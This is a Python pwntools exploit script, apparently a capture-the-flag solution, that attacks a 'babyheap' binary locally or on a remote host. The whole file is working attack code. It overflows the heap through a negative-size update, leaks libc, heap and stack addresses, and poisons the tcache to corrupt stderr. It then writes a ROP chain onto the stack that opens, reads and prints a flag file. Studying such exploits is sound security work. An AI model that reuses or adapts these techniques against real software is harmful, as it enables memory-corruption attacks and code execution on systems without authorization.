#!/usr/bin/python3

from pwn import *

elf = ELF('./babyheap')

context.arch = elf.arch
context.binary = elf
context.terminal = ["terminator", "-u", "-e"]

def get_conn(env=None):
	if env is None: env = {}
	
	if args.GDB:
		return gdb.debug(elf.path, '\n'.join([
			# "breakrva 0x1A8B",
			# "breakrva 0x1ED9",
			# "breakrva 0x1E7f", # read_bytes, while cond
			# "breakrva 0x194D", 
			# "breakrva 0x1874", 
			# "breakrva 0x1898", # malloc in alloc
			"c"
		]), env=env)
	elif args.REMOTE:
		return remote("47.100.33.132", "2204")
		# return remote("localhost", "1000")
	else:
		return process(elf.path, env=env)

p = get_conn()
r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=False)
ru = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
li = lambda s: log.info(s)
ls = lambda s: log.success(s)
cl = lambda: p.clean(timeout=1)

alloc_arr = set()

def get_idx():
	for i in range(0x10):
		if i not in alloc_arr:
			alloc_arr.add(i)
			return i

	raise Exception("BAD")

def alloc(size, content):
	# memset(ptr, 0, size)
	sla(b'Command: ', b'1')
	sla(b'Size: ', str(size).encode())
	if size:
		sla(b'Content: ', content)

	idx = get_idx()
	print(f'Alloc: {idx}')
	return idx
	

def free(idx):
	sla(b'Command: ', b'3')
	sla(b'Index: ', str(idx).encode())
	alloc_arr.remove(idx)

def update(idx, size, content):
	sla(b'Command: ', b'2')
	sla(b'Index: ', str(idx).encode())
	sla(b'Size: ', str(size).encode())
	sla(b'Content: ', content)

def view(idx):
	sla(b'Command: ', b'4')
	sla(b'Index: ', str(idx).encode())
	return rl()

def exit():
	sla(b'Command: ', b'5')

alloc(0x10, b'11')
kuba = alloc(0x10, b'22')
alloc(0x600, b'22')
alloc(0x10, b'33')
alloc(0x600, b'22')
alloc(0x30, b'33')

update(0, -0x10, b'B' * 0x10 + p64(0) + p64(0x81))
free(1)
alloc(0x70, b'B' * 0x18 + p64(0x611))
free(2)
free(4)
leak = view(1)
leak = leak[len(b'Chunk[1]: BBBBBBBBBBBBBBBBBBBBBBBB\x11\x06\x00\x00\x00\x00\x00\x00'):]
libc_leak = u64(leak[:8])
heap_leak = u64(leak[8:16])
li(f'libc leak {hex(libc_leak)}')
li(f'heap leak {hex(heap_leak)}')

libc_base = libc_leak - 0x219ce0
heap_base = heap_leak - 0x900
li(f'libc leak {hex(libc_base)}')
li(f'heap base {hex(heap_base)}')

libc = ELF("./libc.so.6")
libc.address = libc_base
# partial relro ^

# fix & cleanup heap
update(0, -0x10, b'B' * 0x10 + p64(0) + p64(0x21))
free(3)
free(1)
alloc(0x600, b'XXXXX')
alloc(0x600, b'XXXXX')

environ = libc.symbols['_environ']
stdout_fake_ptrs = libc.address + 0x21a803
std_err = libc.symbols['_IO_2_1_stderr_']

# fake tcache ptr
# 2b0 - chunk location
enc_ptr = std_err ^ ((heap_base + 0x2b0) >> 12)
update(0, -0x10, b'B' * 0x10 + p64(0) + p64(0x21) + p64(enc_ptr)[:-1])

alloc(0x10, b'AA')

# std_err chunk
idx = alloc(0x10, b'CC')
# update(idx, -0x10,
# 		b'A' * 0xe0 +
# 		p64(0x0000000fbad2887) +
# 		p64(stdout_fake_ptrs) +
# 		p64(stdout_fake_ptrs) +
# 		p64(stdout_fake_ptrs) +
# 		p64(stdout_fake_ptrs) +
# 		p64(stdout_fake_ptrs) +
# 		p64(stdout_fake_ptrs) +
# 		p64(stdout_fake_ptrs)
# 	)

update(idx, -0x10,
		b'A' * 0xe0 +
		p64(0xfbad1800) + # _flags
		p64(environ) * 3 + # _IO_read_*
		p64(environ) + # _IO_write_base
		p64(environ + 0x8)*2 + # _IO_write_ptr + _IO_write_end
		p64(environ + 8) + # _IO_buf_base
		p64(environ + 8)
	)

stack_leak = rl()
stack_leak = u64(stack_leak[:8])
li(f'stack leak {hex(stack_leak)}')

ret_from_main = stack_leak - 0x120 - 8
li(f'ret_from_main {hex(ret_from_main)}')


idx = alloc(0x30, b'rop prep')
idx2 = alloc(0x80, b'AA')
alloc(0x30, b'no collapse')
free(alloc(0x80, b'AA'))
free(idx2)
enc_ptr = ret_from_main ^ ((heap_base + 0xf90) >> 12)
update(idx, -0x10, b'B' * 0x30 + p64(0) + p64(0x91) + p64(enc_ptr)[:-1])

alloc(0x80, b'AA')

read_to = heap_base + 0x2b0
rop = ROP(libc, base=ret_from_main+8)
rop.call('syscall', [2, b"./flag", 0, 0])
rop.call("read", [3, read_to, 0x40])
rop.call("puts", [read_to])
rop.call("exit")
print(rop.dump())

# chunk on stack
final = alloc(0x80, p64(0))
update(final, -0x10, p64(0) + rop.chain())

exit()

ia()



